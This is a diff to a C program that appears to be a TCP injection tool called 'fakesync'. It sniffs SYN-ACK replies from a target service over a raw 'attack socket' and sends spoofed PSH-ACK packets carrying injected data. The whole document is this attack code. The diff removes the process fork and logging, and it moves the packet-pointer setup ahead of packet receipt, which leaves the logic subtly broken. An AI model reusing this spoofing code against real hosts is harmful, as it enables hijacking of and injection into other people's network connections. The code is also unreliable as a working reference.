@@ -75,8 +75,6 @@ int main(int argc, char *argv[]) {
     struct sockaddr_in sa;
     char *data;
 
-    logfile=fopen("injection.log","w+");
-
     csa.sa_handler = sigchld_handler; // reap all dead processes
 	sigemptyset(&csa.sa_mask);
 	csa.sa_flags = SA_RESTART;
@@ -105,6 +103,10 @@ int main(int argc, char *argv[]) {
     }
 
     service_port = htons(service_port);
+
+    // init pointers
+    new_iph = (struct iphdr *) buf;
+    new_tcph= (struct tcphdr*) (buf + new_iph->ihl * 4);
 
     // open attack socket
     if ((attack_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
@@ -176,12 +178,7 @@ int main(int argc, char *argv[]) {
             goto error;
         }
 
-        if (!fork()) {
-            new_iph = (struct iphdr *) buf;
-            new_tcph= (struct tcphdr*) (buf + new_iph->ihl * 4);
-
-            // check for syn to the service
-
+        // if (!fork()) {
             if (new_iph -> protocol != IPPROTO_TCP) goto final; // check if packet is TCP packet
             if ((new_tcph -> syn != 1) || (new_tcph -> ack != 1)) goto final; // only care about syn ack packets
             if ((new_iph -> saddr != service_addr) && (new_tcph -> source != service_port)) goto final; // destination has to be the service
@@ -204,17 +201,12 @@ int main(int argc, char *argv[]) {
             // dynamic IP fields
             iph -> saddr = new_iph->daddr;
 
-            // inet_ntop(AF_INET, &(daddr), ipstr, INET_ADDRSTRLEN);
-
-            // fprintf(logfile, "DEBUG sending PSH ACK to service %s:%u ......\n", ipstr, ntohs(dport));
-            // fprintf(logfile, "DEBUG %s\n", ipstr);
-
             if ((num = sendto(attack_sock, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
             {
                 perror("fakesync: sendto()\n");
             }
             goto final;
-        }
+        // }
     }
 
 final:
